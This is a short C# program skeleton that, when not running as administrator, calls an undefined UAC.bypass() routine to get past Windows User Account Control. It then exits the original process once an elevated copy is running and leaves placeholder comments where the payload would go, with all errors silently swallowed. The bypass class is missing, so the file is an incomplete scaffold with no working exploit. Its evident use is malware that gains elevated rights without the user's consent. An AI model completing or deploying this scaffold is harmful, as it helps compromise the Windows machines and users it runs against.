using System;
using System.Diagnostics;
using Microsoft.Win32;
using System.Security.Principal;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;

public class Program
{

[STAThread]
public static void Main(string[] args)
{
    try
    {
        Application.EnableVisualStyles();
        Application.SetCompatibleTextRenderingDefault(false);

        if (!IsAdmin()) 
        {
                UAC.bypass(); // the uac bypass call
                Thread.Sleep(2500);

                if (IsElevatedInstanceRunning())
                {
                    Environment.Exit(0);
                }
            // call a function here 
        }
        else
        {
         // call a function here
        }
    }
      catch { } // forgot to add this
}
private static bool IsElevatedInstanceRunning()
{
    string currentprocessname = Process.GetCurrentProcess().ProcessName;
    Process[] getproc = Process.GetProcessesByName(currentprocessname);
    if (getproc.Length <= 1)
    {
        return false;
    }
    return true;
}

    public static bool IsAdmin()
    {
        using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
        {
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
    }
}

